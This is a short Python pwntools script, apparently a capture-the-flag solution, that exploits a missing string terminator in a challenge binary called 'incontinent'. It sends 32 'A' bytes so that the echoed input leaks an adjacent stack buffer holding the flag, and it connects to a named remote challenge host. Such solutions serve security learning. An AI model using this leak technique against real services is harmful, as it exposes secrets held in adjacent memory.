from pwn import *

# The flag is stored on the stack in a buffer placed immediately after the
# 32-byte user input buffer. The program reads input and echoes it back.
#
# If we send exactly 32 bytes, the read does not write a trailing NUL byte
# past our data (the buffer is full). When the program prints the input,
# printf (or similar) keeps reading into the adjacent stack memory until
# it hits a NUL, leaking the flag that sits right after our buffer.
#
# No RIP control needed; this is an information leak / stack disclosure.
#
# checksec: Partial RELRO, NX, no canary, no PIE (irrelevant for this vuln).

def main():
    if args.LOCAL:
        r = process('./incontinent_dist')
    else:
        r = remote('chals.cyberjousting.com', 1366)

    r.recvuntil(b'it?\n')

    payload = b'A' * 32
    r.send(payload)

    r.recvuntil(payload)
    output = r.recvall(timeout=1).decode('utf-8', errors='ignore')
    flag = output.split('\n')[0].strip()

    print(f"\n[+] Flag: {flag}")

if __name__ == '__main__':
    main()
